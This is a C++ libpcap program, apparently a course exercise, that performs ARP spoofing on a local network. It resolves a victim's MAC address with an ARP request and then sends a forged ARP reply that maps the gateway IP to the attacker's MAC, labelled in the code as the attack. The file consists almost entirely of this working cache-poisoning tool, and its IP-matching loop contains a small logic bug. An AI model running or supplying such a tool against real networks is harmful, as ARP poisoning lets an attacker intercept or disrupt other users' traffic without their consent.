#include <cstdio>
#include <stdint.h>
#include <pcap.h>
#include <string.h>
#include <string>
#include <stdlib.h> 
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "eth_hdr.h"
#include "arp_hdr.h"

struct EthArpPacket {
	eth_hdr eth;
	arp_hdr arp;
};

uint8_t* split(uint8_t* tip, char argv[])
{
    char* token = strtok(argv, ".");
    int i = 0;
    while (token != NULL && i < 4) {
        tip[i++] = atoi(token);
        token = strtok(NULL, ".");
    }
    return tip;
}

void getMyMac(u_char *mymac, char NI[])
{
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Failed to create socket");
        exit(1);
    }

    char* ifname = NI;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("Failed to get MAC address");
        exit(1);
    }
    close(sockfd);
	memcpy(mymac, ifr.ifr_hwaddr.sa_data, 6);
}

void getMyIP(uint8_t *myIP, char NI[])
{
	struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char myip[NI_MAXHOST] = {0};  

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;

        family = ifa->ifa_addr->sa_family;

        if (family == AF_INET) { 
            if (strcmp(ifa->ifa_name, NI) == 0) {
                s = getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in),
                                myip, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
                if (s != 0) {
                    printf("getnameinfo() failed: %s\n", gai_strerror(s));
                    freeifaddrs(ifaddr);
                    exit(EXIT_FAILURE);
                }
                break;
            }
        }
    }

    freeifaddrs(ifaddr);
	myIP = split(myIP, myip);

}

EthArpPacket makeArpPacket(uint16_t oper, u_char *smac, u_char *dmac, u_char *arp_smac, u_char *arp_tmac, uint8_t *sip, uint8_t *tip)
{
	EthArpPacket packet;

	packet.eth.ethType = htons(0x0806);
	packet.arp.HType = htons(0x0001);
	packet.arp.PType = htons(0x0800);
	packet.arp.HLen = 0x06;
	packet.arp.PLen = 0x04;
	packet.arp.Oper = htons(oper);

	for(int i=0; i<6; i++){
		packet.eth.smac[i]=smac[i];
		packet.eth.dmac[i]=dmac[i];
		packet.arp.smac[i]=arp_smac[i];
		packet.arp.tmac[i]=arp_tmac[i];
	}

	for(int i=0; i<4; i++){
	packet.arp.sip[i] = sip[i];
	packet.arp.tip[i] = tip[i];
	}

	return packet;
}

void sendArp(pcap_t* pcap, EthArpPacket packet)
{
	printf("sent an ARP packet\n");
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}
}

void getArp(pcap_t* pcap, pcap_pkthdr **header, const u_char **data)
{
	int res = pcap_next_ex(pcap, header, data);
	if(res != 1)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}
}

int main(int argc, char* argv[]) 
{

	if (argc < 3 || argc%2 != 0) 
	{
    fprintf(stderr, "Usage: %s <interface> <sender-ip> <target-ip>\n", argv[0]);
    return EXIT_FAILURE;
}

	u_char mymac[6];
	uint8_t myip[4];
	getMyMac(mymac, argv[1]);
	getMyIP(myip, argv[1]);

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, 0, 0, 0, errbuf);
	pcap_t* res_pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr || res_pcap == nullptr) 
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	// int cnt = (argc -2) / 2;
	// int i = 2;
	// while(cnt--)
	// {
	// get sender's MAC
	uint8_t vip_arr[4];
	uint8_t *vip = split(vip_arr, argv[2]);
	uint8_t gip_arr[4];
	uint8_t *gip = split(gip_arr, argv[3]);
	u_char ff[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
	u_char zero[] = {0,0,0,0,0,0};
	uint8_t vmac[6];

	EthArpPacket packet = makeArpPacket(0x0001, mymac, ff, mymac, zero, myip, vip);

		while(true){
		
		// arp request
		sendArp(pcap, packet);

		printf("receiving packets\n");
		// arp response
		struct pcap_pkthdr *header;
		const u_char *data;

		getArp(res_pcap, &header, &data);
		const EthArpPacket* res_packet = reinterpret_cast<const EthArpPacket*>(data);

		if (ntohs(res_packet->eth.ethType) != 0x0806) continue;
		if (ntohs(res_packet->arp.Oper) != 0x0002) continue;
		for(int i=0; i<4; i++){
			if(res_packet->arp.sip[i] != vip[i]) continue;
		}
			memcpy(vmac, res_packet->arp.smac, sizeof(uint8_t)*6 );
			break;
		}
	
		// attack
		EthArpPacket attackPacket = makeArpPacket(0x0002, mymac, vmac, mymac, vmac, gip, vip);
		printf("Attacking now\n");
		sendArp(pcap, attackPacket);

	//}
	pcap_close(res_pcap);
	pcap_close(pcap);

}
